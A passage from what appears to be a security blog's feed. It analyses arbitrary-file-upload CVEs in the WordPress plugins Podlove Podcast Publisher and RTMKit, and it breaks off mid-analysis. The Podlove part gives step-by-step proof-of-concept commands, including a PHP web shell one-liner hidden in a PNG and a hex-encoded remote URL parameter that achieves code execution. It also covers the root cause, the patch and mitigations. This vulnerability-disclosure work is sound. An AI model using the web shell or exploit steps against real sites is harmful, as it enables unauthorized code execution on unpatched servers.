aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Request with params (podlove_image_cache_url)&amp;#34;] --&amp;gt; B[&amp;#34;podlove_handle_cache_files()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;hex2str() → $source_url → new Image(...)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;download_source() → download_url() → temporary file&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;is_image() check&amp;#34;]&#xA;E -- pass --&amp;gt; F[&amp;#34;move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;File accessible → possible RCE&amp;#34;]&#xA;E -- fail --&amp;gt; H[&amp;#34;Delete temp file → stop&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Inject a &lt;code&gt;&amp;lt;php&amp;gt;&lt;/code&gt; tag into an image file and rename the file to &lt;code&gt;.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;echo &amp;#39;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]); ?&amp;gt;&amp;#39; &amp;gt;&amp;gt; rce.png&#xA;mv rce.png rce.php&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ cat rce.php&#xA;�PNG&#xA;␦&#xA;IHD��Ud�tEXtSoftwaregnome-screenshot��&amp;gt;-tEXtCreation TimeSat 01 Nov 2025 02:58:29 PM &amp;#43;075����IDATH���A&#xA;� ��GHI��l��l�˅��K�n�D&#xA;�H)���a:kooܲ&amp;lt;`�u�o�&#xA;�{�3�9�1�~��      �9����P�1����R�!D&amp;gt;Lk���FT�r�|�Ru��&#x9;u��o&amp;#39;�`��?�!&amp;#34;��&#xA;2k���IEND�B`�&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]); ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Host the file somewhere on the internet on a domain different from the WordPress site, for example:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Hex-encode the URL (&lt;code&gt;https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;❯ echo -n &amp;#34;https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&amp;#34; | xxd -p&#xA;68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Send a GET request with param &lt;code&gt;podlove_image_cache_url=68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-05-cve-2025-10147/file_uploaded.png&#34; title=&#34;File uploaded successfully&#34; data-thumbnail=&#34;/posts/2025-11-05-cve-2025-10147/file_uploaded.png&#34; data-sub-html=&#34;&lt;h2&gt;File Uploaded&lt;/h2&gt;&lt;p&gt;File uploaded successfully&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-05-cve-2025-10147/file_uploaded.png&#39; alt=&#34;File Uploaded&#34; height=&#34;414&#34; width=&#34;1541&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;File uploaded successfully&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Access the created file and achieve RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-05-cve-2025-10147/result.png&#34; title=&#34;RCE via uploaded file&#34; data-thumbnail=&#34;/posts/2025-11-05-cve-2025-10147/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE via uploaded file&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-05-cve-2025-10147/result.png&#39; alt=&#34;Result&#34; height=&#34;723&#34; width=&#34;1541&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE via uploaded file&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;02/9acf743e6beb9c8e4395ee694d6504&lt;/code&gt; as analyzed earlier is &lt;code&gt;md5($url)&lt;/code&gt;, then the directory structure &lt;code&gt;first_2_characters/remaining_characters&lt;/code&gt; is created from that &lt;code&gt;md5()&lt;/code&gt; result&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in &lt;strong&gt;Podlove Podcast Publisher ≤ 4.2.6&lt;/strong&gt; allows arbitrary file upload due to missing file type validation in &lt;code&gt;move_as_original_file()&lt;/code&gt;. An attacker can upload malicious files (e.g., &lt;code&gt;.php&lt;/code&gt;) into:&#xA;&lt;code&gt;wp-content/cache/podlove/&amp;lt;first2&amp;gt;/&amp;lt;rest&amp;gt;/&lt;/code&gt;,&#xA;which can lead to &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; if the file is publicly accessible.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Root cause: weak MIME checking and no blocking of dangerous extensions.&lt;/li&gt;&#xA;&lt;li&gt;Patch (≥ 4.2.7): added validation using &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt; and a denylist.&lt;/li&gt;&#xA;&lt;li&gt;Mitigation: update the plugin, prevent PHP execution in the cache directory, and remove suspicious files.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/podlove-podcasting-plugin-for-wordpress/vulnerability/wordpress-podlove-podcast-publisher-plugin-4-2-6-unauthenticated-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Podlove Podcast Publisher Plugin &amp;lt;= 4.2.6 is vulnerable to Arbitrary File Upload &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-62065 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-04-cve-2025-62065/</link>
      <pubDate>Tue, 04 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-04-cve-2025-62065/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-04-cve-2025-62065/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-62065&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-62065&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.6.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.6.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/rometheme-for-elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;RTMKit&lt;/strong&gt;: &lt;strong&gt;1.6.5&lt;/strong&gt; (vulnerable) and &lt;strong&gt;1.6.6&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff comparison tool to inspect and compare differences between the two versions.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Elementor&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;function rtm_handle_upload_template()&#xA;{&#xA;    check_ajax_referer(&amp;#39;rtm_template_nonce&amp;#39;, &amp;#39;nonce&amp;#39;);&#xA;&#xA;    if (empty($_FILES[&amp;#39;file&amp;#39;])) {&#xA;        wp_send_json_error(&amp;#39;No file uploaded.&amp;#39;);&#xA;    }&#xA;&#xA;    $file = $_FILES[&amp;#39;file&amp;#39;];&#xA;    $ext = strtolower(pathinfo($file[&amp;#39;name&amp;#39;], PATHINFO_EXTENSION));&#xA;    if ($ext !== &amp;#39;zip&amp;#39;) {&#xA;        wp_send_json_error(&amp;#39;Only .zip files are allowed.&amp;#39;);&#xA;    }&#xA;&#xA;    $upload_dir = wp_upload_dir();&#xA;    // path on server&#xA;    $tmpFilePath = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rtm_temp_&amp;#39; . wp_unique_filename($upload_dir[&amp;#39;basedir&amp;#39;], $file[&amp;#39;name&amp;#39;]);&#xA;&#xA;    // public URL&#xA;    $tmpFileUrl  = $upload_dir[&amp;#39;baseurl&amp;#39;] . &amp;#39;/&amp;#39; . basename($tmpFilePath);&#xA;&#xA;    if (!move_uploaded_file($file[&amp;#39;tmp_name&amp;#39;], $tmpFilePath)) {&#xA;        wp_send_json_error(&amp;#39;Failed to save temporary file.&amp;#39;);&#xA;    }&#xA;&#xA;    $res = $this-&amp;gt;template_extract($tmpFileUrl, $file[&amp;#39;name&amp;#39;], true);&#xA;&#xA;    // after done remove file&#xA;    if (file_exists($tmpFilePath)) unlink($tmpFilePath);&#xA;    if ($res) {&#xA;        wp_send_json_success(&amp;#39;Template successfully uploaded and extracted.&amp;#39;);&#xA;    } else {&#xA;        wp_send_json_error($res);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function template_extract($url, $id, $return = false)&#xA;{&#xA;    $upload_dir = wp_upload_dir();&#xA;    $custom_dir = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rometheme_template&amp;#39;;&#xA;    $tempFile = wp_tempnam($url);&#xA;&#xA;    $hashId = wp_hash($id);&#xA;    $targetDir = $custom_dir . &amp;#39;/&amp;#39; . $hashId;&#xA;&#xA;    $response = wp_remote_get($url, [&amp;#39;timeout&amp;#39; =&amp;gt; 300]);&#xA;&#xA;    if (is_wp_error($response)) {&#xA;        wp_send_json_error($response-&amp;gt;get_error_message());&#xA;    }&#xA;&#xA;    $fileContent = wp_remote_retrieve_body($response);&#xA;&#xA;    file_put_contents($tempFile, $fileContent);&#xA;&#xA;    $zip = new ZipArchive();&#xA;    if ($zip-&amp;gt;open($tempFile) === TRUE) {&#xA;        wp_mkdir_p($targetDir);&#xA;        $zip-&amp;gt;extractTo($targetDir);&#xA;        $zip-&amp;gt;close();&#xA;        unlink($tempFile);&#xA;&#xA;        $option = get_option(&amp;#39;rtm_template_installed&amp;#39;, []); // Default to array if option not present&#xA;        if (!is_array($option)) {&#xA;            $option = []; // Ensure $option is an array&#xA;        }&#xA;        $option[$hashId] = [&#xA;            &amp;#39;template_id&amp;#39; =&amp;gt; $id&#xA;        ];&#xA;&#xA;        update_option(&amp;#39;rtm_template_installed&amp;#39;, $option); // Save back to database&#xA;&#xA;        if ($return) {&#xA;            return true;&#xA;        } else {&#xA;            wp_send_json_success([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;success extract&amp;#39;, &amp;#39;template&amp;#39; =&amp;gt; $hashId]);&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;No proper user capability check:&lt;/strong&gt; it only calls &lt;code&gt;check_ajax_referer()&lt;/code&gt; but does not verify capability (e.g., &lt;code&gt;current_user_can&lt;/code&gt;) → a user with a valid nonce or a leaked nonce can still upload.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Temporary file saved in the public uploads folder (&lt;code&gt;wp_upload_dir()&lt;/code&gt;):&lt;/strong&gt; &lt;code&gt;$tmpFilePath&lt;/code&gt; is under &lt;code&gt;uploads/&lt;/code&gt; so it is accessible via a URL (&lt;code&gt;$tmpFileUrl&lt;/code&gt;) while the file exists.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Retrieves the file via the public URL before extraction:&lt;/strong&gt; &lt;code&gt;template_extract()&lt;/code&gt; uses &lt;code&gt;wp_remote_get($tmpFileUrl)&lt;/code&gt; → depends on a public URL.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Extracts directly into a public directory:&lt;/strong&gt; &lt;code&gt;extractTo($targetDir)&lt;/code&gt; into &lt;code&gt;uploads/rometheme_template&lt;/code&gt; → if a &lt;code&gt;.php&lt;/code&gt; file is placed, the webserver may execute it.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No whitelist/deny for extensions:&lt;/strong&gt; does not remove or reject executable files (&lt;code&gt;.php&lt;/code&gt;, &lt;code&gt;.phtml&lt;/code&gt;, &lt;code&gt;.phar&lt;/code&gt;, &lt;code&gt;.sh&lt;/code&gt;, &lt;code&gt;.exe&lt;/code&gt;, &amp;hellip;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No content check for embedded PHP:&lt;/strong&gt; there is no step to scan for &lt;code&gt;&amp;lt;?php&lt;/code&gt; before 